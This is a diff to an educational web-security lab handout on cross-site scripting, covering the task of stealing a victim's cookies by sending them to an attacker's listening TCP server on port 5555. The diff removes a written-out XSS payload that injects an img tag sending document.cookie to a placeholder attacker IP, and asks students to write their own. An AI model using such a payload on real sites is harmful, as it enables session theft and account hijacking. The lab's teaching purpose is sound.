@@ -210,14 +210,10 @@ Task 3: Stealing Cookies from the Victim's machine
   We can do this by having the malicious JavaScript insert an <img> tag with src
   attribute set to the attacker's machine. When the JavaScript inserts the img
   tag, the browser tries to load the image from the URL in the src field; this
-  results in an HTTP GET request sent to the attacker's machine. The JavaScript
-  given below sends the cookies to the port 5555 of the attacker's machine,
+  results in an HTTP GET request sent to the attacker's machine. Your JavaScript
+  code should send the cookies to the port 5555 of the attacker's machine,
   where the attacker has a TCP server listening to the same port. The server can
   print out whatever it receives. The TCP server program will be given to you.
- 
-    <script>document.write('<img src=http://attacker_IP_address:5555?c='
-      + escape(document.cookie) + ' >'); 
-    </script> 
  
   Note: To build the TCP echo server, type "make" in the echoserver directory to
   compile, and please read the README file on important information regarding
